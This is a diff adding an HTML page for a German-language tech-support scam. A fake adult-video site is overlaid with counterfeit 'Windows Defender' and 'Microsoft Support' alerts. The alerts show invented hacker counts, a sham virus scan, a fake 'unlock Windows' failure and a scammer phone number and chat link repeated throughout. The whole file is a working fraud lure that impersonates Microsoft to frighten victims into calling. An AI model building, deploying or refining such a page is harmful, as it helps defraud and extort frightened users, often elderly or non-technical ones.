@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <!-- ==================== GLOBAL CONFIGURATION ==================== -->
+    <!-- Change this phone number once and it will be used everywhere on the site -->
+    <script>
+        const GLOBAL_PHONE_NUMBER = '0044-131-392-7809';
+    </script>
+    <!-- ==================== END GLOBAL CONFIGURATION ==================== -->
+    
+    <!-- Fathom - beautiful, simple website analytics -->
+<script src="https://cdn.usefathom.com/script.js" data-site="MPPUSVJV" defer></script>
+<!-- / Fathom -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ Security Alert - Action Required!</title>
+    <link rel="icon" id="favicon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚠️</text></svg>">
+    
+    <!-- Local CSS -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="chat-debug.css">
+    
+    <!-- External CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+    
+    <!-- External JS -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- Pusher for WebSocket -->
+    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
+    
+    <!-- Chat Configuration - Local Development with INSTANT WebSocket -->
+    <script>
+        // Always use staging server configuration
+        window.CHAT_CONFIG = {
+            server: 'https://chatstaging.maxlandmedia.com',
+            wsHost: 'chatstaging.maxlandmedia.com',
+            wsPort: 443,
+            wsKey: 'xjghttmxpqekynr9djr9'
+        };
+        console.log('🚀 CHAT CONFIGURED FOR STAGING:', window.CHAT_CONFIG);
+    </script>
+</head>
+<body class="overlay-active">
+    <!-- Background Audio -->
+    <audio id="background-audio" loop>
+        <source src="audio-ms.mp3" type="audio/mpeg">
+    </audio>
+    
+    <!-- 18+ Age Verification Prompt -->
+    <div id="age-verification-overlay" style="display: none;">
+        <div class="age-verification-backdrop"></div>
+        <div class="age-verification-prompt">
+            <button class="age-close-btn" id="age-close" title="Schließen">×</button>
+            <div class="age-prompt-icon">
+                <img src="overlay/18.png" alt="18+">
+            </div>
+            <h2>Bist du 18+?</h2>
+            <p>Du musst 18 Jahre oder älter sein, um fortzufahren</p>
+            <div class="age-choice-buttons">
+                <button class="age-yes-btn" id="age-yes">Ja, ich bin 18+</button>
+                <button class="age-no-btn" id="age-no">Nein</button>
+            </div>
+            <button class="age-cancel-btn" id="age-cancel">Abbrechen</button>
+        </div>
+    </div>
+
+    <!-- Video Player Website Overlay -->
+    <div id="video-player-site">
+        <div class="video-site-container">
+            <!-- Header -->
+            <header class="video-site-header">
+                <div class="header-left">
+                    <button class="menu-btn"><i class="fas fa-bars"></i></button>
+                    <div class="site-logo">
+                        <img src="overlay/overlay-logo.png" alt="Logo">
+                    </div>
+                </div>
+                <div class="header-search">
+                    <input type="text" placeholder="Suchen" readonly>
+                    <button><i class="fas fa-search"></i></button>
+                </div>
+                <div class="header-right">
+                    <button class="header-icon-btn"><i class="fas fa-video"></i></button>
+                    <button class="header-icon-btn"><i class="fas fa-bell"></i></button>
+                    <button class="login-btn">Anmelden</button>
+                    <button class="signup-btn">Registrieren</button>
+                </div>
+            </header>
+
+            <!-- Main Content -->
+            <div class="video-site-content">
+                <!-- Main Video Player -->
+                <div class="main-player-section">
+                    <div class="video-player-wrapper">
+                        <video id="main-player-video" autoplay loop muted playsinline controls preload="auto">
+                            <source src="" type="video/mp4">
+                            Dein Browser unterstützt das Video-Tag nicht.
+                        </video>
+                    </div>
+                    <div class="video-info">
+                        <h2 id="current-video-title">Video wird geladen...</h2>
+                        <div class="video-meta-row">
+                            <div class="video-stats">
+                                <span class="views"><span id="video-views">0</span> Aufrufe</span>
+                                <span class="date"><span id="video-date">Heute</span></span>
+                            </div>
+                            <div class="video-actions">
+                                <button class="action-btn">
+                                    <i class="fas fa-thumbs-up"></i>
+                                    <span class="like-count">1,2 Tsd</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-thumbs-down"></i>
+                                    <span>Gefällt mir nicht</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-share"></i>
+                                    <span>Teilen</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-plus"></i>
+                                    <span>Speichern</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-ellipsis-h"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Channel Info -->
+                    <div class="channel-info">
+                        <div class="channel-avatar">
+                            <i class="fas fa-user-circle"></i>
+                        </div>
+                        <div class="channel-details">
+                            <h3 class="channel-name">xHamster</h3>
+                            <p class="subscriber-count">2,4 Mio. Abonnenten</p>
+                        </div>
+                        <button class="subscribe-btn">Abonnieren</button>
+                    </div>
+                    
+                    <!-- Video Description -->
+                    <div class="video-description">
+                        <p>Exklusive Inhalte für Erwachsene. Bitte beachten Sie, dass dieses Video nur für Personen über 18 Jahren bestimmt ist.</p>
+                        <button class="show-more-btn">Mehr anzeigen</button>
+                    </div>
+                    
+                    <!-- Comments Section -->
+                    <div class="comments-section">
+                        <div class="comments-header">
+                            <h3><span class="comment-count">847</span> Kommentare</h3>
+                            <div class="sort-comments">
+                                <i class="fas fa-sort-amount-down"></i>
+                                <span>Sortieren nach</span>
+                            </div>
+                        </div>
+                        
+                        <div class="add-comment">
+                            <div class="comment-avatar">
+                                <i class="fas fa-user-circle"></i>
+                            </div>
+                            <input type="text" placeholder="Kommentar hinzufügen..." readonly>
+                        </div>
+                        
+                        <div class="comments-list">
+                            <div class="comment-item">
+                                <div class="comment-avatar">
+                                    <i class="fas fa-user-circle"></i>
+                                </div>
+                                <div class="comment-content">
+                                    <div class="comment-header">
+                                        <span class="comment-author">@HamsterFan2024</span>
+                                        <span class="comment-date">vor 2 Stunden</span>
+                                    </div>
+                                    <p class="comment-text">Wow, das ist echt geil! Genau mein Geschmack 🔥</p>
+                                    <div class="comment-actions">
+                                        <button><i class="fas fa-thumbs-up"></i> 156</button>
+                                        <button><i class="fas fa-thumbs-down"></i></button>
+                                        <button>Antworten</button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="comment-item">
+                                <div class="comment-avatar">
+                                    <i class="fas fa-user-circle"></i>
+                                </div>
+                                <div class="comment-content">
+                                    <div class="comment-header">
+                                        <span class="comment-author">@DeutscheFan789</span>
+                                        <span class="comment-date">vor 5 Stunden</span>
+                                    </div>
+                                    <p class="comment-text">Hammer Video! Vielen Dank fürs Teilen!</p>
+                                    <div class="comment-actions">
+                                        <button><i class="fas fa-thumbs-up"></i> 89</button>
+                                        <button><i class="fas fa-thumbs-down"></i></button>
+                                        <button>Antworten</button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="comment-item">
+                                <div class="comment-avatar">
+                                    <i class="fas fa-user-circle"></i>
+                                </div>
+                                <div class="comment-content">
+                                    <div class="comment-header">
+                                        <span class="comment-author">@Zuschauer2024</span>
+                                        <span class="comment-date">vor 1 Tag</span>
+                                    </div>
+                                    <p class="comment-text">Sehr heiß! Mehr davon bitte! 😍</p>
+                                    <div class="comment-actions">
+                                        <button><i class="fas fa-thumbs-up"></i> 234</button>
+                                        <button><i class="fas fa-thumbs-down"></i></button>
+                                        <button>Antworten</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Sidebar with Thumbnails -->
+                <div class="sidebar-videos">
+                    <h3>Als Nächstes</h3>
+                    <div id="video-thumbnails-list">
+                        <!-- Thumbnails will be dynamically generated -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="main-content"></div>
+    <div class="contact-support">
+        <div style="background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%); padding: 24px 24px 16px 24px;">
+            <img src="icons/windows.png" alt="Windows Logo" class="windows-logo">
+        </div>
+        <h3>Microsoft Support kontaktieren</h3>
+        <p class="phone">0044-131-392-7809</p>
+        <p class="toll-free">(Gebührenfrei)</p>
+        <button class="support-chat-btn" onclick="openChat()">
+            <img src="icons/windows.png" alt="Microsoft" class="btn-logo">
+            Chat mit Microsoft
+        </button>
+    </div>
+    
+    <div class="network-stats-box">
+        <div class="stats-header">
+            <img src="icons/windows.png" alt="Sicherheit" class="stats-icon">
+            <span class="stats-title">Netzwerksicherheitsmonitor</span>
+        </div>
+        <div class="stats-content">
+            <div class="stat-item">
+                <div class="stat-icon red-icon">🔴</div>
+                <div class="stat-info">
+                    <div class="stat-label">Aktive Hacker erkannt</div>
+                    <div class="stat-value"><span class="hackers-count">3</span> Eindringversuche/Sekunde</div>
+                </div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-icon blue-icon">🌐</div>
+                <div class="stat-info">
+                    <div class="stat-label">Ausländische IP-Adressen</div>
+                    <div class="stat-value"><span class="foreign-ips-count">12</span> Verbindungen blockiert/Sekunde</div>
+                </div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-icon orange-icon">🛡️</div>
+                <div class="stat-info">
+                    <div class="stat-label">Firewall-Verstöße</div>
+                    <div class="stat-value"><span class="firewall-breaches-count">8</span> unbefugte Versuche/Sekunde</div>
+                </div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-icon yellow-icon">⚠️</div>
+                <div class="stat-info">
+                    <div class="stat-label">Datenabfluss</div>
+                    <div class="stat-value"><span class="data-transfer">2.4 GB</span> Übertragung blockiert</div>
+                </div>
+            </div>
+        </div>
+        <div class="stats-footer">
+            <span class="stats-status">● LIVE</span>
+            <span class="stats-time">Echtzeitüberwachung</span>
+        </div>
+    </div>
+    <div class="security-warning-window">
+        <div class="window-header">
+            <img src="icons/windows.png" alt="Windows Logo" class="defender-logo">
+            <span>Windows Defender Sicherheitscenter</span>
+            <div class="window-controls">
+                <button class="minimize">−</button>
+                <button class="maximize">□</button>
+                <button class="close">×</button>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="warning-content">
+                <div class="warning-header">
+                    <img src="icons/windows.png" alt="Windows Logo" class="large-logo">
+                    <div class="header-text">
+                        <h2 class="danger-text">VIREN & BEDROHUNGSSCHUTZ</h2>
+                        <p class="warning-message">Windows Defender hat mehrere kritische Bedrohungen auf Ihrem Computer erkannt. Trojaner-Viren versuchen, auf Ihre persönlichen Informationen und Bankdaten zuzugreifen. Sofortiges Handeln ist erforderlich.</p>
+                    </div>
+                </div>
+
+                <div class="main-content">
+                    <div class="security-alert">
+                        <div class="error-code">
+                            <span class="code">Fehlercode: 0x80070005</span>
+                            <span class="status status-dynamic">BEDROHUNG ERKANNT</span>
+                        </div>
+                        
+                        <div class="scan-progress-section">
+                            <div class="scan-bar-container">
+                                <div class="scan-bar"></div>
+                            </div>
+                            <div class="scan-info">
+                                <span>Scanvorgang: <span class="scanning-file">C:\Windows\System32\</span><span class="file-cursor">_</span></span>
+                                <span>Gescannte Dateien: <span class="files-counter">0</span></span>
+                            </div>
+                        </div>
+                        
+                        <div class="alert-message">
+                            <div class="alert-line">🔴 Aktive Hacker erkannt: <span class="highlight hackers-count">3</span> Eindringversuche/Sekunde</div>
+                            <div class="alert-line">🌐 Ausländische IP-Adressen: <span class="highlight foreign-ips-count">12</span> Verbindungen blockiert</div>
+                            <div class="alert-line">🛡️ Firewall-Verstöße: <span class="highlight firewall-breaches-count">8</span> unbefugte Versuche</div>
+                            <div class="alert-line warning">⚠️ Datenabfluss: <span class="highlight data-transfer">2.4 GB</span> Übertragung blockiert</div>
+                        </div>
+                        
+                        <div class="detected-threats">
+                            <div class="threat-title">Netzwerksicherheitsbedrohungen:</div>
+                            <div class="threat-list">
+                                <div class="threat-item threat-appear" style="animation-delay: 0.5s">
+                                    <span class="threat-icon">⚠️</span>
+                                    <span class="threat-name dynamic-threat-1">Unbefugter Zugriff von IP 185.220.101.47 erkannt</span>
+                                </div>
+                                <div class="threat-item threat-appear" style="animation-delay: 1s">
+                                    <span class="threat-icon">⚠️</span>
+                                    <span class="threat-name dynamic-threat-2">SSL-Zertifikat kompromittiert - Port 443 Verstoß</span>
+                                </div>
+                                <div class="threat-item threat-appear" style="animation-delay: 1.5s">
+                                    <span class="threat-icon">⚠️</span>
+                                    <span class="threat-name dynamic-threat-3">DNS-Hijacking erkannt - Datenverkehr wird umgeleitet</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bottom-section">
+                    <div class="support-section">
+                        <div class="support-icon-wrapper">
+                            <img src="icons/windows.png" alt="Windows Logo" class="support-logo">
+                        </div>
+                        <div class="support-text">
+                            <p class="support-label">Microsoft Support - Kritische Warnung</p>
+                            <p class="phone-number" id="defender-phone">0044-131-392-7809</p>
+                            <p class="support-subtitle">Jetzt anrufen • 24/7 verfügbar</p>
+                        </div>
+                    </div>
+
+                    <div class="action-buttons">
+                        <button id="jetzt-chatten-btn" class="cancel chat-defender-btn" onclick="openChat()">Jetzt chatten</button>
+                    </div>
+                </div>
+                
+                <div class="defender-action-buttons">
+                    <button id="defender-ok-btn" class="defender-btn-ok">Ok</button>
+                    <button id="unlock-windows-btn" class="defender-btn-unlock">Windows entsperren</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="defender-window">
+        <div class="window-header">
+            <img src="icons/windows.png" alt="Defender Logo" class="defender-logo">
+            <span>Microsoft Defender Antivirus</span>
+            <div class="window-controls">
+                <button class="minimize">−</button>
+                <button class="maximize">□</button>
+                <button class="close">×</button>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="scan-summary">
+                <h2>Schnellscan läuft</h2>
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress" id="scan-progress"></div>
+                    </div>
+                    <div class="progress-text">
+                        <span id="progress-percentage">0</span>% abgeschlossen
+                    </div>
+                </div>
+                <div class="scan-stats">
+                    <p>Verstrichene Zeit: <span id="time-elapsed">00:00:00</span></p>
+                    <p>Gescannte Elemente: <span id="items-scanned">0</span></p>
+                    <p>Gefundene Bedrohungen: <span id="threats-found">0</span></p>
+                </div>
+                <div class="scan-log">
+                    <h3>Scan-Protokoll</h3>
+                    <div class="log-container" id="scan-log">
+                        <!-- Protokolleinträge werden hier dynamisch hinzugefügt -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="notifications-container"></div>
+    
+    <!-- Unlock Windows Modal -->
+    <div id="unlock-modal" class="unlock-modal" style="display: none;">
+        <div class="unlock-window">
+            <div class="unlock-header">
+                <img src="icons/windows.png" alt="Windows Logo" class="unlock-logo">
+                <span>Windows Entsperren</span>
+                <div class="unlock-controls">
+                    <button class="unlock-close" id="unlock-close-btn">×</button>
+                </div>
+            </div>
+            <div class="unlock-content">
+                <!-- Loading Screen -->
+                <div id="unlock-loading" class="unlock-loading">
+                    <div class="loading-spinner"></div>
+                    <p class="loading-text">Windows wird entsperrt...</p>
+                    <p class="loading-subtext">Bitte warten Sie</p>
+                </div>
+                
+                <!-- Failure Message -->
+                <div id="unlock-failed" class="unlock-failed" style="display: none;">
+                    <div class="failed-icon">⚠️</div>
+                    <h2 class="failed-title">Entsperren fehlgeschlagen</h2>
+                    <p class="failed-message">Windows konnte nicht entsperrt werden. Bitte kontaktieren Sie den Support.</p>
+                    <div class="failed-support">
+                        <p class="failed-support-label">Microsoft Support</p>
+                        <p class="failed-support-phone" id="unlock-phone">0044-131-392-7809</p>
+                    </div>
+                    <button class="failed-chat-btn" onclick="openChat()">
+                        <img src="icons/windows.png" alt="Microsoft" class="failed-btn-logo">
+                        Jetzt chatten
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Local JS -->
+    <script src="script.js"></script>
+    <script src="chat-debug.js"></script>
+    
+    <!-- Apply Global Phone Number to all elements -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneElements = document.querySelectorAll('.phone, .phone-number, #defender-phone, #unlock-phone');
+            phoneElements.forEach(function(element) {
+                if (element) {
+                    element.textContent = GLOBAL_PHONE_NUMBER;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
+
